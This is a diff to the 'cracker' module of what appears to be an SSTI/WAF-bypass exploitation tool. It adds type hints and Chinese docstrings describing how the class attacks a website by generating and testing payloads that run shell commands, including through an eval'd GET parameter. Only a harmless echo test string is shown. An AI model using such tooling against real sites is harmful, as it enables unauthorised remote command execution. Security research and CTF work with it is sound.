@@ -2,15 +2,14 @@
 
 """
 
-from hashlib import new
 import logging
 import random
+
 from collections import namedtuple
 from string import ascii_lowercase
-from typing import Union, Callable, Dict
+from typing import Union, Callable, Dict, Tuple
 
-from fenjing.form import random_fill
-
+from .form import random_fill
 from .submitter import FormSubmitter, RequestSubmitter, Submitter
 from .colorize import colored
 from .const import (
@@ -23,13 +22,15 @@ from .const import (
 )
 from .waf_func_gen import WafFuncGen
 from .full_payload_gen import FullPayloadGen
-from fenjing import submitter
 
 logger = logging.getLogger("cracker")
 Result = namedtuple("Result", "full_payload_gen input_field")
 
 
 class Cracker:
+    """
+    针对某个网站进行攻击
+    """
     test_cmd = "echo f3n  j1ng;"
     test_eval = "'f'+str(3)+'n j'+str(1)+\"ng\""
     test_result = "f3n j1ng"
@@ -64,7 +65,15 @@ class Cracker:
         self._callback = callback
         self.waf_func_gen.callback = callback
 
-    def test_payload(self, payload: str):
+    def test_payload(self, payload: str) -> bool:
+        """测试某个执行shell指令的payload是否会产生回显
+
+        Args:
+            payload (str): 用于测试的payload
+
+        Returns:
+            bool: 是否产生回显
+        """
         logger.info(
             "Testing generated payload.",
         )
@@ -73,7 +82,17 @@ class Cracker:
         _, text = result
         return self.test_result in text
 
-    def test_payload_eval_args(self, payload: str, subm: Submitter):
+    def test_payload_eval_args(self, payload: str, subm: Submitter) -> bool:
+        """测试某个进行eval的payload是否会产生回显
+
+        Args:
+            payload (str): 用于测试的payload
+            subm (Submitter): 
+                用于提交payload的submitter, 可能和self中的submitter不同
+
+        Returns:
+            bool: 是否产生回显
+        """
         logger.info(
             "Testing generated payload as eval args.",
         )
@@ -82,13 +101,23 @@ class Cracker:
         _, text = result
         return self.test_result in text
 
-    def has_respond(self):
+    def has_respond(self) -> bool:
+        """测试对应的submitter是否会产生回显（显示我们提交的数据）
+
+        Returns:
+            bool: 是否产生回显
+        """
         content = "".join(random.choices(ascii_lowercase, k=6))
         resp = self.subm.submit(content)
         assert resp is not None
         return content in resp.text
 
-    def crack(self):
+    def crack(self) -> Union[FullPayloadGen, None]:
+        """开始进行攻击，生成一个执行shell命令的payload，测试并返回payload生成器
+
+        Returns:
+            Union[FullPayloadGen, None]: 生成器
+        """
         logger.info("Cracking...")
         waf_func = self.waf_func_gen.generate()
         full_payload_gen = FullPayloadGen(
@@ -116,7 +145,14 @@ class Cracker:
             )
         return full_payload_gen
 
-    def crack_eval_args(self):
+    def crack_eval_args(self) -> Union[Tuple[FullPayloadGen, Submitter, bool], None]:
+        """开始进行攻击，生成一个会eval GET参数x中命令的payload, 将其放进一个新的submitter中并返回。
+        新的submitter会填充GET参数x、提交并返回结果。
+
+        Returns:
+            Union[Tuple[FullPayloadGen, Submitter, bool], None]: 
+                产生的payload生成器，提交器，以及是否会产生回显
+        """
         logger.info("Cracking with request GET args...")
         assert isinstance(
             self.subm, FormSubmitter
@@ -145,7 +181,9 @@ class Cracker:
             url=self.subm.url,
             method=method,
             target_field=args_target_field,
-            params=random_fill(self.subm.form) | payload_dict if method == "GET" else {},
+            params=random_fill(self.subm.form) | payload_dict
+            if method == "GET"
+            else {},
             data=random_fill(self.subm.form) | payload_dict if method != "GET" else {},
             requester=self.subm.req,
         )
